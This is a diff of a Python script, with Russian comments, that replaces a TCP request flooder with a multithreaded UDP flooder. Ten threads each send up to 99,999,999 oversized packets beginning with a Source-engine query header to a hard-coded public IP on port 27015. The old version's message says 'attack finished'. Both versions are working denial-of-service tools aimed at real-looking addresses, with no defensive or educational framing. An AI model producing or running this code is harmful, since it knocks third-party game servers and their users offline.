@@ -1,23 +1,35 @@
 import socket
-import random
-import time
+import threading
 
-target_ip = "135.181.76.187"  # сюда айпи 
-target_port = 27010
-duration = 100
+# Настройки сервера
+server_ip = "151.106.5.230"
+server_port = 27015
 
-def send_data(target_ip, target_port):
+# Данные для отправки
+data = b"\xff\xff\xff\xff" + b"A" * 1000
+num_requests = 99999999  # Количество запросов
+
+# Функция отправки запросов
+def send_requests():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.settimeout(1)
-        client.connect((target_ip, target_port))
-        client.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
-        client.close()
-    except Exception as e:
-        print(f"Ошибка: {e}")
+        for _ in range(num_requests):
+            sock.sendto(data, (server_ip, server_port))
+    finally:
+        sock.close()
 
-start_time = time.time()
-while time.time() - start_time < duration:
-    send_data(target_ip, target_port)
+# Количество потоков
+num_threads = 10
 
-print("Атака завершена")
+# Создание и запуск потоков
+threads = []
+for _ in range(num_threads):
+    thread = threading.Thread(target=send_requests)
+    thread.start()
+    threads.append(thread)
+
+# Ожидание завершения всех потоков
+for thread in threads:
+    thread.join()
+
+print(f"Все запросы отправлены на сервер {server_ip}:{server_port}.")
